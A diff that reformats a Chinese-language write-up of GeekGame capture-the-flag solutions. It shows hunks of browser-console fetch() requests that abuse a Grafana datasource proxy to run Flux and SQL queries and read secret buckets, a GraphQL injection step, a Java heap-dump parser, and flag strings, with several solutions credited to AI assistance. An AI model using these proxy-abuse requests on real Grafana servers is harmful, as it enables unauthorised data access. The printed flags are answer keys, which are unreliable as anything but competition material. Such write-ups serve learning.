@@ -430,11 +430,11 @@ flag{eScape_TechnIQUES_upDatE_wiTH_timE}
 
 > 本题目codex记录已经放在文件中供确认，修改了一些不影响的隐私数据
 
-## *勒索病毒
+## \*勒索病毒
 
 > **misc-ransomware**
 
-### \*Flag1&*Flag2&\*Flag3
+### \*Flag1&\*Flag2&\*Flag3
 
 #### CODEX IS ALL YOU NEED
 
@@ -448,7 +448,7 @@ flag{eScape_TechnIQUES_upDatE_wiTH_timE}
 
 ## 取证大师#一血
 
-> **misc-DFIR** 
+> **misc-DFIR**
 
 #### CODEX IS ALL YOU NEED
 
@@ -518,11 +518,11 @@ flag{eScape_TechnIQUES_upDatE_wiTH_timE}
 
 就能得到flag: `flag{An0THEr_Bor1NG_JAvascRIPT_s4nDBOx}`
 
-## *统一身份认证
+## \*统一身份认证
 
 > **web-graphauth**
 
-### *Flag1
+### \*Flag1
 
 首先我们要先注册一个账号，这边注册一个账号test/pass。
 
@@ -534,7 +534,7 @@ pass"){login:login(username:$username,password:$password){ok isAdmin:ok username
 
 登录获得flag。
 
-### *Flag2
+### \*Flag2
 
 再构建一个密码进行查询
 
@@ -577,7 +577,7 @@ The final result of the second step is the answer I need.
 
 利用函数漏洞即可获得flag2。
 
-## *高可信数据大屏
+## \*高可信数据大屏
 
 > **web-grafana**
 
@@ -586,20 +586,20 @@ The final result of the second step is the answer I need.
 登录后构建命令
 
 ```javascript
-fetch('/api/datasources/proxy/1/api/v2/query?org=org', {
-  method: 'POST',
-  credentials: 'include',
+fetch("/api/datasources/proxy/1/api/v2/query?org=org", {
+  method: "POST",
+  credentials: "include",
   headers: {
-    'Content-Type': 'application/vnd.flux',
-    'Accept': 'text/csv',
-    'X-DS-Authorization': 'Token token'
+    "Content-Type": "application/vnd.flux",
+    Accept: "text/csv",
+    "X-DS-Authorization": "Token token",
   },
   body: `
 buckets()
   |> keep(columns: ["name"])
-`.trim()
+`.trim(),
 })
-  .then(r => r.text())
+  .then((r) => r.text())
   .then(console.log)
   .catch(console.error);
 ```
@@ -619,13 +619,13 @@ buckets()
 再发个信息获取一下这个里面的内容
 
 ```javascript
-fetch('/api/datasources/proxy/1/api/v2/query?org=org', {
-  method: 'POST',
-  credentials: 'include',
+fetch("/api/datasources/proxy/1/api/v2/query?org=org", {
+  method: "POST",
+  credentials: "include",
   headers: {
-    'Content-Type': 'application/vnd.flux',
-    'Accept': 'text/csv',
-    'X-DS-Authorization': 'Token token'
+    "Content-Type": "application/vnd.flux",
+    Accept: "text/csv",
+    "X-DS-Authorization": "Token token",
   },
   body: `
 from(bucket: "secret_523689538")        // ← 这里改成你的 bucket 名
@@ -633,28 +633,28 @@ from(bucket: "secret_523689538")        // ← 这里改成你的 bucket 名
   |> filter(fn: (r) => string(v: r._value) =~ /flag\\{/)
   |> keep(columns: ["_value"])  // 只留下 flag 字段
   |> limit(n: 1)                // 第一条就是 flag1
-`.trim()
+`.trim(),
 })
-  .then(r => r.text())
+  .then((r) => r.text())
   .then(console.log)
   .catch(console.error);
 ```
 
 我们得到`flag{TOTALlY-nO-pErMiSSIon-IN-graFanA}`
 
-### *Flag2
+### \*Flag2
 
 在获得提示后，AI辅助下能构造这么一个请求
 
 ```javascript
-fetch('/api/datasources/proxy/1/api/v2/query?org=org', {
-  method: 'POST',
-  credentials: 'include',
+fetch("/api/datasources/proxy/1/api/v2/query?org=org", {
+  method: "POST",
+  credentials: "include",
   headers: {
-    'Content-Type': 'application/vnd.flux',
-    'Accept': 'text/csv',
+    "Content-Type": "application/vnd.flux",
+    Accept: "text/csv",
     // 如果环境真需要 token，可改成正确的；大部分题目默认无鉴权
-    'X-DS-Authorization': 'Token token'
+    "X-DS-Authorization": "Token token",
   },
   body: `
 import "sql"
@@ -668,12 +668,11 @@ sql.from(
 |> map(fn: (r) => ({ r with _time: now() }))   // 补 _time，避免 CSV 序列化抱怨
 |> duplicate(column: "email", as: "_value")    // 让邮箱落到 _value，便于查看
 |> limit(n:1)
-`.trim()
+`.trim(),
 })
-  .then(r => r.text())
+  .then((r) => r.text())
   .then(console.log)
   .catch(console.error);
-
 ```
 
 在F12 console中运行得到结果
@@ -728,7 +727,7 @@ bytes.fromhex("666c61677b70523176314c4547652d457343616c6154494f4e2d574974482d6c4
 
 > 本题目codex记录已经放在文件中供确认，修改了一些不影响的隐私数据
 
-## *7 岁的毛毛：我要写 Java
+## \*7 岁的毛毛：我要写 Java
 
 > **binary-java**
 
@@ -740,7 +739,8 @@ bytes.fromhex("666c61677b70523176314c4547652d457343616c6154494f4e2d574974482d6c4
 
 > 本题目codex记录已经放在文件中供确认，修改了一些不影响的隐私数据
 
-### *Flag3
+### \*Flag3
+
 ```java
 import com.sun.management.HotSpotDiagnosticMXBean;
 import java.lang.management.ManagementFactory;
@@ -808,7 +808,7 @@ public class Solution {
         Set<Long> rootFrame  = new HashSet<>();
 
         while (p + 9 <= buf.length) {
-            int tag = u1(buf, p++); 
+            int tag = u1(buf, p++);
             int time = readU4(buf, p); p += 4;
             int len  = readU4(buf, p); p += 4;
             if (len < 0) return null;
@@ -1572,7 +1572,7 @@ Choose an action:
 1) Sign message
 2) Request flag
 > All interactions logged to log.txt
-username@computer algo-tree % 
+username@computer algo-tree %
 ```
 
 诶这不就有flag了吗
@@ -1599,7 +1599,7 @@ username@computer algo-tree %
 >
 > 多次修改尝试未果，不得不放弃。
 
-##  滑滑梯加密
+## 滑滑梯加密
 
 > **algo-slide**
 
@@ -1812,7 +1812,7 @@ if __name__ == "__main__":
 ```zsh
 [*] connecting to prob12.geekgame.pku.edu.cn:10012
 [banner start]
-Please input your token: 
+Please input your token:
 [banner end]
 [after sending token+easy]
 
